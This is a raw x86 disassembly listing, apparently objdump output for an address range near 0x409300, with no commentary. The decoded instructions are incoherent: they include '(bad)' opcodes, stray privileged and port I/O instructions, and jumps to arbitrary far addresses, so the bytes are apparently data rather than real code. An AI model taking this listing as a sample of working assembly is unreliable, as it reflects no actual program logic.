  4092f0:	and    cl,BYTE PTR [edx-0x206e5003]
  4092f6:	int3   
  4092f7:	aas    
  4092f8:	hlt    
  4092f9:	mov    eax,0x59800cc5
  4092fe:	push   edi
  4092ff:	outs   dx,DWORD PTR ds:[esi]
  409300:	add    eax,0xd94d2cb3
  409305:	cmp    DWORD PTR [edx],eax
  409307:	les    ebp,FWORD PTR [eax+eax*1-0x6803cf8a]
  40930e:	cs int3 
  409310:	cmp    BYTE PTR [edi-0xd],ah
  409313:	icebp  
  409314:	call   0xa2291f62
  409319:	sar    BYTE PTR [ecx],0xd9
  40931c:	imul   edi,ebp,0xb56e04d6
  409322:	jo     0x4092c8
  409324:	dec    esp
  409325:	outs   dx,DWORD PTR ds:[esi]
  409326:	or     al,BYTE PTR [ebp-0x4e]
  409329:	and    BYTE PTR [esi],bh
  40932b:	jg     0x409327
  40932d:	and    DWORD PTR [ebx],esp
  40932f:	add    DWORD PTR [edi],esp
  409331:	jbe    0x409332
  409333:	xor    esp,ecx
  409335:	out    dx,eax
  409336:	loop   0x409358
  409338:	outs   dx,BYTE PTR ds:[esi]
  409339:	mov    WORD PTR [ecx-0x4f],ds
  40933c:	xchg   esi,eax
  40933d:	pop    eax
  40933e:	ins    BYTE PTR es:[edi],dx
  40933f:	or     DWORD PTR [ecx-0x39ef2d85],0xb19471f7
  409349:	mov    ebx,0x8cf7cf11
  40934e:	inc    edi
  40934f:	push   esi
  409350:	call   0xb00e:0x987ac4
  409357:	dec    eax
  409358:	xchg   BYTE PTR [edi+0x1e],ch
  40935b:	push   0x403cccb9
  409360:	jae    0x409329
  409362:	sub    ebp,edx
  409364:	or     bl,BYTE PTR [edi-0x1d13c7b]
  40936a:	ffreep st(1)
  40936c:	jmp    0x40934c
  40936e:	loopne 0x40938e
  409370:	mov    es,WORD PTR [eax-0x71]
  409373:	cmp    al,0xa9
  409375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409376:	loope  0x4092f8
  409378:	dec    ebp
  409379:	mov    edi,0xeeb1d1c9
  40937e:	shl    DWORD PTR [eax],cl
  409380:	sbb    BYTE PTR [edx+0x20],bh
  409383:	bound  eax,QWORD PTR [eax+0x70]
  409386:	fsubr  QWORD PTR [eax+edx*8]
  409389:	fist   DWORD PTR [ebx]
  40938b:	xchg   ecx,eax
  40938c:	mov    ch,BYTE PTR [ebx-0x39cd4f52]
  409392:	out    dx,al
  409393:	xor    bl,BYTE PTR [edi]
  409395:	aad    0x3a
  409397:	xchg   esi,eax
  409398:	push   0xbea8d3cf
  40939d:	(bad)  
  40939e:	out    dx,al
  40939f:	sub    DWORD PTR [ebx],0x1e
  4093a2:	(bad)  
  4093a4:	ins    DWORD PTR es:[edi],dx
  4093a5:	pop    esi
  4093a6:	mov    edx,0x2366052f
  4093ab:	shl    DWORD PTR [eax+0x56],cl
  4093ae:	inc    esp
  4093af:	sbb    eax,0xec020afa
  4093b4:	cmp    ebx,DWORD PTR [ebp+0x34]
  4093b7:	(bad)  
  4093b8:	dec    ebx
  4093b9:	ja     0x4093ec
  4093bb:	shl    bh,cl
  4093bd:	mov    bh,0xa2
  4093bf:	fwait
  4093c0:	push   0x19957cb2
  4093c5:	jbe    0x40938d
  4093c7:	gs jle 0x409395
  4093ca:	in     eax,0x4f
  4093cc:	hlt    
  4093cd:	mov    cl,bh
  4093cf:	adc    esp,DWORD PTR [edi+esi*1-0x66f9dca4]
  4093d6:	mov    dh,0x98
  4093d8:	push   edi
  4093d9:	int    0xce
  4093db:	adc    dh,BYTE PTR [eax]
  4093dd:	jbe    0x4093fa
  4093df:	arpl   WORD PTR [ebp+0x44],cx
  4093e2:	cs xor bh,ah
  4093e5:	test   BYTE PTR [esi-0x7596a2c1],ah
  4093eb:	gs mov eax,0x7bad32bd
  4093f1:	sahf   
  4093f2:	jno    0x4093a1
  4093f4:	ret    
  4093f5:	pusha  
  4093f6:	cmp    eax,0xa1e58c71
  4093fb:	cmc    
  4093fc:	add    eax,0xc1e772f1
  409401:	and    BYTE PTR [ebp+eax*4+0x7b],cl
  409405:	rol    BYTE PTR [ecx],cl
  409407:	out    dx,al
  409408:	jmp    0x40941e
  40940a:	jecxz  0x409469
  40940c:	pmaddwd mm4,QWORD PTR [esi+0x6541ff16]
  409413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409414:	xor    al,dl
  409416:	test   eax,0x5167d8f4
  40941b:	and    bh,dh
  40941d:	std    
  40941e:	cwde   
  40941f:	dec    eax
  409420:	cli    
  409421:	sbb    eax,0xa532c8ad
  409426:	xchg   DWORD PTR [edi+0x4b5bbc0e],esp
  40942c:	mov    ds:0xe344de65,eax
  409431:	or     esi,DWORD PTR [edi]
  409433:	inc    ebp
  409434:	xchg   ecx,eax
  409435:	push   cs
  409436:	fdiv   QWORD PTR [edi+edi*1+0x2b]
  40943a:	repz retf 
  40943c:	mov    esp,0x3fab4d4e
  409441:	xadd   DWORD PTR [esi-0x4329c01f],esi
  409448:	arpl   WORD PTR [esi+0x161e8bf0],di
  40944e:	scas   al,BYTE PTR es:[edi]
  40944f:	fs push 0x2639eb8c
  409455:	cwde   
  409456:	jl     0x4093fa
  409458:	jge    0x40940a
  40945a:	pop    ebx
  40945b:	js     0x4094db
  40945d:	loopne 0x4093e7
  40945f:	outs   dx,DWORD PTR ds:[esi]
  409460:	jnp    0x40944c
  409462:	sbb    al,bl
  409464:	idiv   BYTE PTR [eax-0x45]
  409467:	fwait
  409468:	test   DWORD PTR [ecx+0x7925cdeb],ebp
  40946e:	fs push esi
  409470:	in     eax,0xac
  409472:	jnp    0x409499
  409474:	fwait
  409475:	icebp  
  409476:	push   eax
  409477:	jmp    FWORD PTR [edi-0x787f53ef]
  40947d:	es add eax,0xc8f2b2c5
  409483:	fs mov esi,0xcda393b9
  409489:	cmc    
  40948a:	adc    BYTE PTR [ebp+0x54c2a68c],ch
  409490:	lods   eax,DWORD PTR ds:[esi]
  409491:	(bad)  
  409492:	and    al,BYTE PTR [ebx]
  409494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409495:	into   
  409496:	push   cs
  409497:	cmp    ah,ch
  409499:	jmp    0x40945e
  40949b:	jns    0x409516
  40949d:	lahf   
  40949e:	add    bl,BYTE PTR [esi-0x77]
  4094a1:	adc    dh,BYTE PTR [ebp-0x5bcd5a64]
  4094a7:	mov    esp,0x6fb31a8e
  4094ac:	adc    edx,edi
  4094ae:	mov    ebp,0x4067c23c
  4094b3:	sahf   
  4094b4:	mov    ebp,0x832815f5
  4094b9:	dec    ebx
  4094ba:	lods   eax,DWORD PTR ds:[esi]
  4094bb:	xchg   edx,eax
  4094bc:	jne    0x409474
  4094be:	push   ebp
  4094bf:	(bad)  
  4094c0:	push   esi
  4094c1:	dec    ebx
  4094c2:	jns    0x409477
  4094c4:	std    
  4094c5:	add    DWORD PTR [edi+0x4e33ff8d],ebx
  4094cb:	stos   BYTE PTR es:[edi],al
  4094cc:	call   0xb54f:0xe5958dff
  4094d3:	in     al,0xa2
  4094d5:	xor    al,0x3d
  4094d7:	test   BYTE PTR [edx+0x32],dl
  4094da:	stos   DWORD PTR es:[edi],eax
  4094db:	mov    BYTE PTR [eax+0x71f019a6],ah
  4094e1:	xor    dl,dl
  4094e3:	test   DWORD PTR [ecx+eax*8],edi
  4094e6:	fld    QWORD PTR [ecx-0x63641e02]
  4094ec:	cdq    
  4094ed:	dec    esp
  4094ee:	popa   
  4094ef:	fs shl cl,0x6e
  4094f3:	sbb    DWORD PTR [esi-0x47fdb2ee],0x143b761e
  4094fd:	ret    0xe79f
  409500:	into   
  409501:	push   edx
  409502:	cmp    DWORD PTR [ebp-0x6],ecx
  409505:	aam    0xd9
  409507:	xor    eax,DWORD PTR [eax]
  409509:	push   ss
  40950a:	cld    
  40950b:	loop   0x409505
  40950d:	bound  eax,QWORD PTR [edi-0x2c8c07eb]
  409513:	ss jmp 0x4094cf
  409516:	fistp  WORD PTR [edx-0x21b9ec24]
  40951c:	mov    ch,0xaa
  40951e:	data16 mov al,ds:0x8c474c86
  409524:	or     bl,BYTE PTR [edi-0x606d58b1]
  40952a:	outs   dx,DWORD PTR ds:[esi]
  40952b:	push   esp
  40952c:	ret    
  40952d:	sti    
  40952e:	loopne 0x4095a4
  409530:	outs   dx,BYTE PTR ds:[esi]
  409531:	enter  0x8131,0x62
  409535:	sbb    al,0x74
  409537:	mov    al,ds:0x304810d
  40953c:	pushf  
  40953d:	jo     0x409587
  40953f:	in     al,dx
  409540:	push   edx
  409541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409542:	inc    ecx
  409543:	push   esp
  409544:	popf   
  409545:	ins    BYTE PTR es:[edi],dx
  409546:	adc    al,0x58
  409548:	test   ebp,ecx
  40954a:	je     0x40958e
  40954c:	mov    eax,0x603e93de
  409551:	mov    ebp,ss
  409553:	cmp    bl,0x9e
  409556:	jo     0x409511
  409558:	ret    0xfdd9
  40955b:	fst    DWORD PTR ds:[ebx+0x7db64b6b]
  409562:	ficomp DWORD PTR [ecx+0x336c2706]
  409568:	xor    eax,0x8c4ae5e9
  40956d:	leave  
  40956e:	push   esp
  40956f:	mul    BYTE PTR ds:0x20dd28a2
  409575:	fs sar edi,1
  409578:	dec    ecx
  409579:	cmp    BYTE PTR [edi+0x5754240a],bl
  40957f:	outs   dx,DWORD PTR ds:[esi]
  409580:	cwde   
  409581:	int    0x7c
  409583:	or     eax,DWORD PTR [edi]
  409585:	inc    ebp
  409586:	mov    eax,ds:0x63f58f7b
  40958b:	and    BYTE PTR [ebp-0x22],bh
  40958e:	ret    0xb7d5
  409591:	test   eax,0x7ad3061c
  409596:	xchg   BYTE PTR [eax-0xa1b8749],cl
  40959c:	lods   eax,DWORD PTR ds:[esi]
  40959d:	and    BYTE PTR [edx],dl
  40959f:	pop    ebx
  4095a0:	test   al,0xb3
  4095a2:	sbb    DWORD PTR [ebx-0x46],esp
  4095a5:	ss repz inc eax
  4095a8:	les    edx,FWORD PTR [ecx-0xe]
  4095ab:	into   
  4095ac:	jmp    0x7ccde923
  4095b1:	ret    
  4095b2:	xor    al,0x55
  4095b4:	ja     0x409585
  4095b6:	adc    al,0xb
  4095b8:	pop    edi
  4095b9:	rcl    DWORD PTR [ecx],0x7e
  4095bc:	nop
  4095bd:	and    DWORD PTR [esp+eax*2],ebp
  4095c0:	clc    
  4095c1:	sub    eax,0x40e3e38f
  4095c6:	cdq    
  4095c7:	push   esi
  4095c8:	push   esi
  4095c9:	mov    cs,WORD PTR [ecx-0x399ce553]
  4095cf:	fwait
  4095d0:	sar    DWORD PTR [edi],0x87
  4095d3:	outs   dx,DWORD PTR ds:[esi]
  4095d4:	jmp    0xafee8e04
  4095d9:	push   ebp
  4095da:	xor    DWORD PTR [eax-0x61553974],esi
  4095e0:	adc    al,BYTE PTR [ecx]
  4095e2:	mov    WORD PTR [esi+ebp*4+0x2ee7ed4a],?
  4095e9:	mov    ecx,0x44c76e7a
  4095ee:	dec    eax
  4095ef:	mov    al,ds:0xe9a12884
  4095f4:	xchg   ecx,eax
  4095f5:	mov    al,ds:0x86ea46c1
  4095fa:	xchg   ebx,eax
  4095fb:	inc    esi
  4095fc:	mov    eax,0xf6423b42
  409601:	hlt    
  409602:	into   
  409603:	cld    
  409604:	and    dl,ch
  409606:	aaa    
  409607:	stos   DWORD PTR es:[edi],eax
  409608:	rcr    ebx,1
  40960a:	xchg   ecx,eax
  40960b:	cli    
  40960c:	cli    
  40960d:	lods   al,BYTE PTR ds:[esi]
  40960e:	int3   
  40960f:	repz mov bh,BYTE PTR [esi-0x518aec16]
  409616:	mov    bl,0x93
  409618:	lds    ecx,FWORD PTR [ebx]
  40961a:	daa    
  40961b:	mov    esp,0xd2998c83
  409620:	mov    DWORD PTR [edi],0x9f57b866
  409626:	daa    
  409627:	mov    DWORD PTR [edi-0xa],esi
  40962a:	ins    DWORD PTR es:[edi],dx
  40962b:	lods   eax,DWORD PTR ds:[esi]
  40962c:	push   cs
  40962d:	jmp    0xb0f8947f
  409632:	jmp    0x40960c
  409634:	cmc    
  409635:	jno    0x409638
  409637:	data16 imul BYTE PTR [si-0x1515]
  40963d:	int    0x6f
  40963f:	scas   al,BYTE PTR es:[edi]
  409640:	cmp    BYTE PTR [ecx+0x10],dl
  409643:	jb     0x40966a
  409645:	dec    ebp
  409646:	ficom  WORD PTR [edx+0x57307f2f]
  40964c:	ins    BYTE PTR es:[edi],dx
  40964d:	aad    0xe9
  40964f:	push   esp
  409650:	cmp    ch,cl
  409652:	test   BYTE PTR [esi+0x3bbc0573],dh
  409658:	and    eax,0xe0126b1b
  40965d:	jle    0x40964b
  40965f:	pop    ebp
  409660:	xchg   edi,eax
  409661:	std    
  409662:	and    al,0x1f
  409664:	cmp    eax,DWORD PTR [edi+0xf]
  409667:	test   DWORD PTR [edi+eiz*8],ecx
  40966a:	mov    al,0x39
  40966c:	lds    ecx,FWORD PTR [eax]
  40966e:	add    al,0xea
  409670:	jl     0x4096da
  409672:	in     eax,dx
  409673:	and    edi,DWORD PTR [eax+edi*1+0x5f]
  409677:	lds    esi,FWORD PTR [esi-0x4975e48d]
  40967d:	sbb    bh,cl
  40967f:	or     esp,0x3835d558
  409685:	jae    0x4096b9
  409687:	xor    ah,bh
  409689:	mov    al,ds:0xd25f5616
  40968e:	(bad)  
  40968f:	popf   
  409690:	cmp    al,0x82
  409692:	mov    bl,0x82
  409694:	lods   eax,DWORD PTR ds:[esi]
  409695:	fcomp  st(3)
  409697:	nop
  409698:	fisubr DWORD PTR [ebx]
  40969a:	or     DWORD PTR [eax+0x3a15dec0],ebx
  4096a0:	in     eax,0xcd
  4096a2:	mov    dh,0x16
  4096a4:	ret    
  4096a5:	jmp    DWORD PTR [ebx]
  4096a7:	push   ecx
  4096a8:	dec    edx
  4096a9:	mov    ds:0x337fa331,al
  4096ae:	nop
  4096af:	ja     0x4096ae
  4096b1:	pop    esp
  4096b2:	mov    es,edx
  4096b4:	call   0x5a05:0xf69bd46e
  4096bb:	xchg   BYTE PTR [eax+0x3bbd6693],bl
  4096c1:	repnz fadd QWORD PTR [edi-0x2fc732d9]
  4096c8:	cmp    DWORD PTR ds:0x4f026c54,edx
  4096ce:	add    BYTE PTR [esi+0x17],cl
  4096d1:	jmp    0x409724
  4096d3:	clc    
  4096d4:	add    eax,0xab0b2119
  4096d9:	sbb    BYTE PTR [eax+0x5c],0xaa
  4096dd:	mov    cl,0x29
  4096df:	mov    ds:0x58651090,eax
  4096e4:	push   es
  4096e5:	mov    ds:0x65b39788,eax
  4096ea:	dec    edi
  4096eb:	add    esi,DWORD PTR [eax-0x19f2e348]
  4096f1:	call   0x1191deb9
  4096f6:	enter  0xf300,0x3b
  4096fa:	out    dx,al
  4096fb:	sbb    ecx,ebx
  4096fd:	add    al,0x6d
  4096ff:	jecxz  0x4096ae
  409701:	sub    edx,ebx
  409703:	sub    DWORD PTR [ebp-0x7e],ecx
  409706:	inc    ecx
  409707:	push   0x48
  409709:	lods   eax,DWORD PTR ds:[esi]
  40970a:	retf   
  40970b:	push   ebp
  40970c:	pop    edi
  40970d:	push   ds
  40970e:	or     ebx,DWORD PTR [esi+0x34c05e45]
  409714:	fild   WORD PTR [ecx-0x15]
  409717:	ret    
  409718:	push   es
  409719:	jmp    0x2f4a:0x73b4a0a7
  409720:	ins    DWORD PTR es:[edi],dx
  409721:	fimul  WORD PTR [ebx]
  409723:	mov    edx,0x66721f7f
  409728:	add    ebx,esp
  40972a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40972b:	mov    ah,0x27
  40972d:	(bad)  
  40972e:	sbb    ebx,DWORD PTR [edx-0xa0f58d6]
  409734:	sbb    DWORD PTR [edi+eax*2+0x47],0xc033202b
  40973c:	push   ebp
  40973d:	outs   dx,DWORD PTR ds:[esi]
  40973e:	mov    dl,BYTE PTR [esi]
  409740:	cmp    al,0x58
  409742:	dec    ebp
  409743:	dec    esp
  409744:	add    BYTE PTR [edi],al
  409746:	cmc    
  409747:	dec    ecx
  409748:	xchg   ebx,eax
  409749:	pop    ebp
  40974a:	add    BYTE PTR [ebx+0x6c],dh
  40974d:	xchg   ecx,eax
  40974e:	arpl   dx,bx
  409750:	nop
  409751:	imul   ebp,DWORD PTR [ecx+edx*1+0x10],0xcfca0355
  409759:	pop    edi
  40975a:	add    al,al
  40975c:	inc    ebp
  40975d:	push   es
  40975e:	mov    dl,0xdb
  409760:	fsubr  QWORD PTR [eax+edi*2+0x2e9621ec]
  409767:	ins    BYTE PTR es:[edi],dx
  409768:	sbb    esp,DWORD PTR [ebp-0x6a5f9241]
  40976e:	cmp    al,0xb1
  409770:	icebp  
  409771:	cmp    DWORD PTR [esi+0x69],esi
  409774:	push   esp
  409775:	pop    edx
  409776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409777:	add    al,0x98
  409779:	(bad)  
  40977a:	mov    eax,ds:0x55560506
  40977f:	test   bh,0x99
  409782:	ret    0x38c5
  409785:	mov    ds:0xf0997171,eax
  40978a:	(bad)  
  40978c:	xchg   ebp,eax
  40978d:	push   ss
  40978e:	loope  0x409757
  409790:	(bad)  
  409791:	pop    eax
  409792:	std    
  409793:	mov    dh,0xd8
  409795:	out    dx,eax
  409796:	dec    edx
  409797:	loope  0x40971b
  409799:	rol    BYTE PTR [esi-0x45],cl
  40979c:	fwait
  40979d:	bts    DWORD PTR [edx-0x78],ebp
  4097a1:	scas   al,BYTE PTR es:[edi]
  4097a2:	lods   eax,DWORD PTR ds:[esi]
  4097a3:	push   eax
  4097a4:	ret    
  4097a5:	aas    
  4097a6:	std    
  4097a7:	scas   eax,DWORD PTR es:[edi]
  4097a8:	(bad)
  4097ab:	cmp    esp,eax
  4097ad:	push   edi
  4097ae:	adc    edi,0x54072ca3
  4097b4:	pop    eax
  4097b5:	outs   dx,DWORD PTR ds:[esi]
  4097b6:	xchg   ebp,eax
  4097b7:	dec    eax
  4097b8:	inc    eax
  4097b9:	(bad)  
  4097ba:	ins    BYTE PTR es:[edi],dx
  4097bb:	adc    esi,DWORD PTR [ebp+0x6fc45fad]
  4097c1:	jbe    0x409835
  4097c3:	and    edx,DWORD PTR [edi-0x2ad82475]
  4097c9:	loop   0x4097d8
  4097cb:	rcr    DWORD PTR ds:0xa133bca3,0x1f
  4097d2:	pop    ecx
  4097d3:	test   ch,0x15
  4097d6:	leave  
  4097d7:	lock std 
  4097d9:	xchg   ecx,eax
  4097da:	mov    ecx,0xd4b65cd1
  4097df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097e0:	inc    edi
  4097e1:	inc    esi
  4097e2:	adc    BYTE PTR [esi],cl
  4097e4:	faddp  st(7),st
  4097e6:	addr16 dec edi
  4097e8:	sub    BYTE PTR [eax-0x163b8e68],dl
  4097ee:	jecxz  0x4097aa
  4097f0:	or     DWORD PTR [ebx-0x17336d6b],esp
  4097f6:	sbb    eax,0xc0a55a99
  4097fb:	or     BYTE PTR [edi+0x4ec99350],0xa4
  409802:	jns    0x40980b
  409804:	(bad)  [eax-0x19febf1]
  40980a:	mov    ebx,0xc83a3f50
  40980f:	shr    DWORD PTR [edi+0x6ef637e5],1
  409815:	loopne 0x4097a3
  409817:	push   ds
  409818:	xchg   ecx,eax
  409819:	xchg   edx,eax
  40981a:	scas   al,BYTE PTR es:[edi]
  40981b:	sbb    cl,BYTE PTR [esi-0x25]
  40981e:	mov    edi,0x359bc207
  409823:	dec    esp
  409824:	retf   0xee56
  409827:	mov    ebx,ebp
  409829:	and    ch,BYTE PTR [esi+0x498cc556]
  40982f:	mov    DWORD PTR [edi+0x45],ebp
  409832:	cli    
  409833:	adc    BYTE PTR [eax+ecx*8-0x6a],al
  409837:	pop    eax
  409838:	lods   eax,DWORD PTR ds:[esi]
  409839:	xor    ch,dh
  40983b:	retf   0xdbde
  40983e:	lods   al,BYTE PTR ds:[esi]
  40983f:	and    eax,ebp
  409841:	(bad)  
  409842:	in     al,dx
  409843:	or     cl,BYTE PTR [eax]
  409845:	cwde   
  409846:	push   0x79
  409848:	mov    ds:0xdc23df5b,al
  40984d:	or     BYTE PTR [edi+0x60],0xb3
  409851:	std    
  409852:	push   esi
  409853:	scas   al,BYTE PTR es:[edi]
  409854:	fild   QWORD PTR [edx-0x7b]
  409857:	cwde   
  409858:	outs   dx,BYTE PTR ds:[esi]
  409859:	add    eax,DWORD PTR [eax+0x5c]
  40985c:	adc    eax,DWORD PTR ds:0xff917504
  409862:	sub    BYTE PTR [edi-0x6fc6f2bc],bl
  409868:	mov    ah,0xcd
  40986a:	enter  0xd93f,0x3b
  40986e:	or     eax,0x890cc69e
  409873:	data16 xor al,0x8c
  409876:	test   BYTE PTR [edi+0x4c459ff2],ah
  40987c:	pop    ebp
  40987d:	inc    eax
  40987e:	mov    WORD PTR [edx-0x464eac09],fs
  409884:	dec    ebp
  409885:	imul   ecx,DWORD PTR [edx+0x358ccd82],0xb84120a2
  40988f:	mov    esi,0xa44a85a7
  409894:	xchg   edx,eax
  409895:	popa   
  409896:	mov    edx,0xfccd8fcb
  40989b:	fsub   st,st(3)
  40989d:	cmc    
  40989e:	ret    
  40989f:	or     DWORD PTR [eax],ecx
  4098a1:	xor    edx,DWORD PTR [eax+0x44]
  4098a4:	jo     0x4098f1
  4098a6:	mov    eax,0xf37e1c75
  4098ab:	or     al,0xca
  4098ad:	mov    bh,0x27
  4098af:	xchg   dl,al
  4098b1:	xor    ecx,DWORD PTR [ebp+0x7f]
  4098b4:	mov    ecx,0xaf8aa8ba
  4098b9:	(bad)  
  4098ba:	jns    0x409895
  4098bc:	js     0x409876
  4098be:	mov    ds:0xf8caebcf,eax
  4098c3:	inc    esp
  4098c4:	pusha  
  4098c5:	das    
  4098c6:	addr16 mov dl,0x7b
  4098c9:	out    0x63,al
  4098cb:	jecxz  0x40985d
  4098cd:	in     al,0xb8
  4098cf:	inc    ecx
  4098d0:	mov    ebx,0x3143190d
  4098d5:	fisttp QWORD PTR [esi-0x2b]
  4098d8:	retf   0x3dbc
  4098db:	ins    BYTE PTR es:[edi],dx
  4098dc:	pop    ecx
  4098dd:	pushf  
  4098de:	jne    0x40986a
  4098e0:	jo     0x4098e0
  4098e2:	fistp  DWORD PTR [ebp+ebx*2-0x74e3afe8]
  4098e9:	lods   al,BYTE PTR ds:[esi]
  4098ea:	hlt    
  4098eb:	push   ss
  4098ec:	mov    ebx,es
  4098ee:	dec    ebx
  4098ef:	cs das 
  4098f1:	outs   dx,DWORD PTR ds:[esi]
  4098f2:	mov    ebx,0xd49f8d27
  4098f7:	(bad)  
  4098f8:	cmp    eax,0x8b8d3517
  4098fd:	and    edi,DWORD PTR [ecx]
  4098ff:	xchg   DWORD PTR [ebx-0x1e],edi
  409902:	and    ebp,DWORD PTR [edi+0x2ed92e50]
  409908:	mov    ds:0xcc17ae56,al
  40990d:	push   edi
  40990e:	push   ds
  40990f:	mov    ds:0x6105b32e,al
  409914:	or     ah,BYTE PTR [edi+0x53]
  409917:	add    al,BYTE PTR [esi-0x1267ba98]
  40991d:	scas   eax,DWORD PTR es:[edi]
  40991e:	shl    DWORD PTR [ebx+edi*4],cl
  409921:	sbb    bh,ah
  409923:	imul   ecx,DWORD PTR ds:0x44c99cbb,0x65
  40992a:	mov    ds:0x86d05ba,eax
  40992f:	(bad)  
  409930:	mov    bl,ch
  409932:	mov    ah,0x18
  409934:	dec    ebp
  409935:	jmp    0x409972
  409937:	test   BYTE PTR [edx],dh
  409939:	out    0xa9,eax
  40993b:	js     0x409980
  40993d:	push   ebp
  40993e:	and    dl,BYTE PTR [edi-0x43a4001b]
  409944:	test   al,0x93
  409946:	sbb    al,0xd7
  409948:	push   ebp
  409949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40994a:	(bad)  
  40994b:	xor    DWORD PTR ds:0xe4047ced,eax
  409951:	sub    ebx,ebx
  409953:	pop    eax
  409954:	setp   BYTE PTR cs:[ebx]
  409958:	jmp    0xfe53:0x42a395b9
  40995f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409960:	test   BYTE PTR [ecx],ch
  409962:	push   es
  409963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409964:	dec    esp
  409965:	dec    esi
  409966:	jge    0x409973
  409968:	jb     0x409901
  40996a:	test   ebp,0x14bbe2e0
  409970:	fcom   DWORD PTR [ebx]
  409972:	adc    BYTE PTR [ebp+eax*8+0x71878051],dl
  409979:	mov    WORD PTR [edi],fs
  40997b:	in     eax,0x97
  40997d:	push   es
  40997e:	hlt    
  40997f:	pop    ss
  409980:	pop    eax
  409981:	xchg   ebx,eax
  409982:	(bad)  
  409983:	mov    dh,0x8c
  409985:	sub    esi,DWORD PTR [ecx+0x69]
  409988:	fsubr  DWORD PTR [eax+ebp*2]
  40998b:	pop    edi
  40998c:	loope  0x40998c
  40998e:	dec    esi
  40998f:	stos   BYTE PTR es:[edi],al
  409990:	pop    esi
  409991:	scas   eax,DWORD PTR es:[edi]
  409992:	push   esi
  409993:	out    dx,eax
  409994:	mov    ah,0x81
  409996:	and    esp,DWORD PTR [edx-0x3c7a327d]
  40999c:	(bad)  
  40999d:	(bad)  [ebp-0x1d]
  4099a0:	mov    dl,BYTE PTR [edi+0x48]
  4099a3:	jae    0x4099df
  4099a5:	mov    fs,WORD PTR [esi]
  4099a7:	jmp    0x409a11
  4099a9:	adc    DWORD PTR [ecx-0x17a9b4c1],esi
  4099af:	pop    ebx
  4099b0:	cmc    
  4099b1:	mov    dh,0xaf
  4099b3:	(bad)  
  4099b6:	pop    esi
  4099b7:	cmp    dl,ch
  4099b9:	mov    al,ds:0xc501029f
  4099be:	mov    eax,ds:0x893a0e9a
  4099c3:	mov    bl,0xe
  4099c5:	test   dl,0x57
  4099c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c9:	inc    ecx
  4099ca:	aam    0x31
  4099cc:	mul    edx
  4099ce:	sti    
  4099cf:	iret   
  4099d0:	lock and eax,0x5fec25eb
  4099d7:	push   ss
  4099d8:	jle    0x409a1e
  4099da:	ss mov al,0xce
  4099dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099de:	fldenv [ecx+0x6a]
  4099e1:	jnp    0x4099f8
  4099e3:	pop    ebx
  4099e4:	or     DWORD PTR [ebx+ecx*8+0x3],ebp
  4099e8:	cs sub eax,0x3309187d
  4099ee:	or     DWORD PTR [esi-0x33c25637],esp
  4099f4:	lods   al,BYTE PTR ds:[esi]
  4099f5:	outs   dx,DWORD PTR ds:[esi]
  4099f7:	ja     0x40997b
  4099f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099fa:	stos   BYTE PTR es:[edi],al
  4099fb:	or     al,0xcf
  4099fd:	pop    eax
  4099fe:	(bad)  
  4099ff:	lods   al,BYTE PTR ds:[esi]
  409a00:	out    dx,eax
  409a01:	into   
  409a02:	jmp    0x409a42
  409a04:	enter  0xd925,0x3b
  409a08:	(bad)  
  409a09:	int3   
  409a0a:	ss leave 
  409a0c:	xor    DWORD PTR [ecx+edx*1],ebx
  409a0f:	repz jno 0x4099c2
  409a12:	dec    ebp
  409a13:	mov    al,0x84
  409a15:	xchg   edx,eax
  409a16:	cmp    BYTE PTR [esi+0x4c],0x51
  409a1a:	das    
  409a1b:	ss clc 
  409a1d:	jge    0x4099f4
  409a1f:	xchg   esp,eax
  409a20:	or     DWORD PTR [ecx+ecx*4+0x7f],eax
  409a24:	dec    esp
  409a25:	dec    esp
  409a26:	inc    eax
  409a27:	cdq    
  409a28:	repnz push cs
  409a2a:	jmp    0xc3980348
  409a2f:	jp     0x4099b3
  409a31:	test   esp,ecx
  409a33:	mov    dl,0x7a
  409a35:	dec    esi
  409a36:	mov    bh,ah
  409a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a39:	pop    esp
  409a3a:	out    dx,eax
  409a3b:	push   edx
  409a3c:	mov    ds:0xeb5e5caa,eax
  409a41:	inc    ebx
  409a42:	sar    DWORD PTR [esi+0xbc0e37e],1
  409a48:	ja     0x409a23
  409a4a:	std    
  409a4b:	into   
  409a4c:	call   0x7723:0xe2c87f79
  409a53:	mov    WORD PTR [ecx+0x41],?
  409a56:	je     0x4099ee
  409a58:	push   cs
  409a59:	ret    
  409a5a:	sub    BYTE PTR [edx],ch
  409a5c:	ja     0x409a1a
  409a5e:	test   BYTE PTR [ebx+0x31],dl
  409a61:	shl    esp,0x59
  409a64:	out    0x68,eax
  409a66:	adc    dl,ch
  409a68:	int3   
  409a69:	(bad)  
  409a6a:	sbb    al,0x95
  409a6c:	mov    ds:0x3ddd41ab,eax
  409a71:	test   BYTE PTR [ecx-0x3c03a506],ah
  409a77:	inc    ecx
  409a78:	jns    0x409ab2
  409a7a:	out    0xb5,al
  409a7c:	in     al,dx
  409a7d:	cmp    al,0x63
  409a7f:	aam    0xe0
  409a81:	mov    BYTE PTR [edx],ch
  409a83:	in     eax,0x9b
  409a85:	sub    BYTE PTR [edi-0x6af14047],dh
  409a8b:	and    eax,0xa36b7f57
  409a90:	scas   eax,DWORD PTR es:[edi]
  409a91:	xor    bl,dh
  409a93:	es cwde 
  409a95:	int3   
  409a96:	stos   DWORD PTR es:[edi],eax
  409a97:	into   
  409a98:	push   esp
  409a99:	add    ch,bh
  409a9b:	pop    ss
  409a9c:	and    eax,0x1b8af3a
  409aa1:	push   es
  409aa2:	ret    0xd19f
  409aa5:	test   al,0xb4
  409aa7:	xor    al,BYTE PTR [ebx+esi*1]
  409aaa:	fs push esi
  409aac:	fadd   DWORD PTR [ebx-0x5548f817]
  409ab2:	dec    esi
  409ab3:	stc    
  409ab4:	cmc    
